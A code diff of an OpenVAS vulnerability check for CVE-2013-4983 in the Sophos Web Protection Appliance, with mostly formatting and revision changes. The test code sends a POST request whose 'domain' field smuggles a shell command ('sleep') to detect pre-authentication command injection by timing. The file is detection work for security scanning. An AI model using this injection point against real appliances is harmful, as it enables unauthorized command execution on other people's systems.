@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_sophos_web_appliance_mult_vuln_09_2013.nasl 6755 2017-07-18 12:55:56Z cfischer $
+# $Id: gb_sophos_web_appliance_mult_vuln_09_2013.nasl 11103 2018-08-24 10:37:26Z mmartin $
 #
 # Sophos Web Protection Appliance Multiple Vulnerabilities
 #
@@ -29,36 +29,36 @@ CPE = 'cpe:/a:sophos:web_appliance';
 
 if (description)
 {
- script_oid("1.3.6.1.4.1.25623.1.0.103781");
- script_version ("$Revision: 6755 $");
- script_cve_id("CVE-2013-4983","CVE-2013-4983");
- script_tag(name:"cvss_base", value:"10.0");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
- script_name("Sophos Web Protection Appliance Multiple Vulnerabilities");
- script_tag(name:"last_modification", value:"$Date: 2017-07-18 14:55:56 +0200 (Tue, 18 Jul 2017) $");
- script_tag(name:"creation_date", value:"2013-09-09 14:28:20 +0200 (Mon, 09 Sep 2013)");
+  script_oid("1.3.6.1.4.1.25623.1.0.103781");
+  script_version("$Revision: 11103 $");
+  script_cve_id("CVE-2013-4983", "CVE-2013-4983");
+  script_tag(name:"cvss_base", value:"10.0");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
+  script_name("Sophos Web Protection Appliance Multiple Vulnerabilities");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-24 12:37:26 +0200 (Fri, 24 Aug 2018) $");
+  script_tag(name:"creation_date", value:"2013-09-09 14:28:20 +0200 (Mon, 09 Sep 2013)");
 
- script_xref(name:"URL" , value:"http://www.coresecurity.com/advisories/sophos-web-protection-appliance-multiple-vulnerabilities");
- script_category(ACT_ATTACK);
- script_family("Web application abuses");
- script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
- script_dependencies("gb_sophos_web_appliance_detect.nasl");
- script_require_ports("Services/www", 443);
- script_mandatory_keys("sophos/web_appliance/installed");
+  script_xref(name:"URL", value:"http://www.coresecurity.com/advisories/sophos-web-protection-appliance-multiple-vulnerabilities");
+  script_category(ACT_ATTACK);
+  script_family("Web application abuses");
+  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
+  script_dependencies("gb_sophos_web_appliance_detect.nasl");
+  script_require_ports("Services/www", 443);
+  script_mandatory_keys("sophos/web_appliance/installed");
 
- script_tag(name : "impact" , value : "An unauthenticated remote attacker can execute arbitrary OS commands
+  script_tag(name:"impact", value:"An unauthenticated remote attacker can execute arbitrary OS commands
  on the Sophos appliance with the privileges of the spiderman operating system user.");
- script_tag(name : "affected" , value : "Sophos Web Appliance v3.7.9 and earlier.
+  script_tag(name:"affected", value:"Sophos Web Appliance v3.7.9 and earlier.
  Sophos Web Appliance v3.8.0.
  Sophos Web Appliance v3.8.1.");
- script_tag(name : "insight" , value : "Sophos Web Protection Appliance is prone to a pre-authentication OS
+  script_tag(name:"insight", value:"Sophos Web Protection Appliance is prone to a pre-authentication OS
  command injection vulnerability and to a privilege escalation through local OS command
  injection vulnerability");
- script_tag(name : "solution" , value : "Update to v3.7.9.1/v3.8.1.1");
- script_tag(name : "summary" , value : "Sophos Web Protection Appliance is prone to multiple vulnerabilities.");
+  script_tag(name:"solution", value:"Update to v3.7.9.1/v3.8.1.1");
+  script_tag(name:"summary", value:"Sophos Web Protection Appliance is prone to multiple vulnerabilities.");
 
- script_tag(name:"solution_type", value:"VendorFix");
- script_tag(name:"qod_type", value:"remote_analysis");
+  script_tag(name:"solution_type", value:"VendorFix");
+  script_tag(name:"qod_type", value:"remote_analysis");
  exit(0);
 }
 
@@ -74,18 +74,18 @@ sleep = make_list(3, 5, 8);
 
 foreach i (sleep) {
 
-  ex = 'url=aHR0cDovL29wZW52YXMub3JnCg%3d%3d&args_reason=something_different_than_filetypewarn&filetype=dummy&user=buffalo' + 
-       '&user_encoded=YnVmZmFsbw%3d%3d&domain=http%3a%2f%2fexample.org%3bsleep%20' + i +  
+  ex = 'url=aHR0cDovL29wZW52YXMub3JnCg%3d%3d&args_reason=something_different_than_filetypewarn&filetype=dummy&user=buffalo' +
+       '&user_encoded=YnVmZmFsbw%3d%3d&domain=http%3a%2f%2fexample.org%3bsleep%20' + i +
        '&raw_category_id=one%7ctwo%7cthree%7cfour';
 
   len = strlen(ex);
 
-  req = 'POST /end-user/index.php?c=blocked&action=continue HTTP/1.1\r\n' + 
-        'Host: ' + host + '\r\n' + 
+  req = 'POST /end-user/index.php?c=blocked&action=continue HTTP/1.1\r\n' +
+        'Host: ' + host + '\r\n' +
         'Content-Type: application/x-www-form-urlencoded\r\n' +
-        'Content-Length: ' + len + '\r\n' + 
-        'Connection: close\r\n' + 
-        '\r\n' + 
+        'Content-Length: ' + len + '\r\n' +
+        'Connection: close\r\n' +
+        '\r\n' +
         ex;
 
   start = unixtime();
